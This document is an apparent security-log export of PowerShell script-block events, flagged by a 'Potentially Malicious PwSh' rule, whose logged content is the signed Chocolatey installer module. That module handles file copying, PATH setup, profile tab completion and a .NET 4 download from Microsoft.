""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.332 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,55,"ScriptBlock: ning ""Tab completion does not currently work in PowerShell v2. `n Please upgrade to a more recent version of PowerShell to take advantage of tab completion."" #Write-ChocolateyWarning ""To load tab expansion, you need to install PowerTab. `n See https://powertab.codeplex.com/ for details."" } } catch { Write-ChocolateyWarning ""Unable to add Chocolatey to the profile. You will need to do it manually. Error was '$_'"" @' This is how add the Chocolatey Profile manually. Find your $profile. Then add the following lines to it: $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ | Write-Output } } $netFx4InstallTries = 0 function Install-DotNet4IfMissing { param( $forceFxInstall = $false ) # we can't take advantage of any chocolatey module functions, because they # haven't been unpacked because they require .NET Framework 4.0 Write-Debug ""Install-DotNet4IfMissing called with `$forceFxInstall=$forceFxInstall"" $NetFxArch = ""Framework"" if ([IntPtr]::Size -eq 8) {$NetFxArch=""Framework64"" } $NetFx4ClientUrl = 'https://download.microsoft.com/download/5/6/2/562A10F9-C9F4-4313-A044-9C94E0A8FAC8/dotNetFx40_Client_x86_x64.exe' $NetFx4FullUrl = 'https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe' $NetFx4Url = $NetFx4FullUrl $NetFx4Path = ""$tempDir"" $NetFx4InstallerFile = 'dotNetFx40_Full_x86_x64.exe' $NetFx4Installer = Join-Path $NetFx4Path $NetFx4InstallerFile if ((!(Test-Path ""$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319"") -and !(Test-Path ""C:\Windows\Microsoft.Net\$NetFxArch\v4.0.30319"")) -or $forceFxInstall) { Write-Output ""'$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319' was not found or this is forced"" if (!(Test-Path $NetFx4Path)) { Write-Output ""Creating folder `'$NetFx4Path`'"" $null = New-Item -Path ""$NetFx4Path"" -ItemType Directory } $netFx4InstallTries += 1 if (!(Test-Path $NetFx4Installer)) { Write-Output ""Downloading `'$NetFx4Url`' to `'$NetFx4Installer`' - the installer is 40+ MBs, so this could take a while on a slow connection."" (New-Object Net.WebClient).DownloadFile(""$NetFx4Url"",""$NetFx4Installer"") } $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.WorkingDirectory = ""$NetFx4Path"" $psi.FileName = ""$NetFx4InstallerFile"" # https://msdn.microsoft.com/library/ee942965(v=VS.100).aspx#command_line_options # http://blogs.msdn.com/b/astebner/archive/2010/05/12/10011664.aspx # For the actual setup.exe (if you want to unpack first) - /repair /x86 /x64 /ia64 /parameterfolder Client /q /norestart $psi.Arguments = ""/q /norestart /repair"" Write-Output ""Installing `'$NetFx4Installer`' - this may take awhile with no output."" $s = [System.Diagnostics.Process]::Start($psi); $s.WaitForExit(); if ($s.ExitCode -ne 0 -and $s.ExitCode -ne 3010) { if ($netFx4InstallTries -ge 2) { Write-ChocolateyError "".NET Framework install failed with exit code `'$($s.ExitCode)`'. `n This will cause the rest of the install to fail."" throw ""Error installing .NET Framework 4.0 (exit code $($s.ExitCode)). `n Please install the .NET Framework 4.0 manually and then try to install Chocolatey again. `n Download at `'$NetFx4Url`'"" } else { Write-ChocolateyWarning ""Try #$netFx4InstallTries of .NET framework install failed with exit code `'$($s.ExitCode)`'. Trying again."" Install-DotNet4IfMissing $true } } } } function Invoke-Chocolatey-Initial { Write-Debug ""Initializing Chocolatey files, etc by running Chocolatey..."" try { $chocoInstallationFolder = Get-ChocolateyInstallFolder $chocoExe = Join-Path -Path $chocoInstallationFolder -ChildPath ""choco.exe"" & $chocoExe -v | Out-Null Write-Debug ""Chocolatey execution completed successfully."" } catch { Write-ChocolateyWarning ""Unable to run Chocolately at this time. It is likely that .Net Framework installation requires a system reboot"" } } Export-ModuleMember -function Initialize-Chocolatey; # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAkEkEipuZa+5py # 29A1WQhQQVpJYzMWl/kN8goJPe7XT6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # 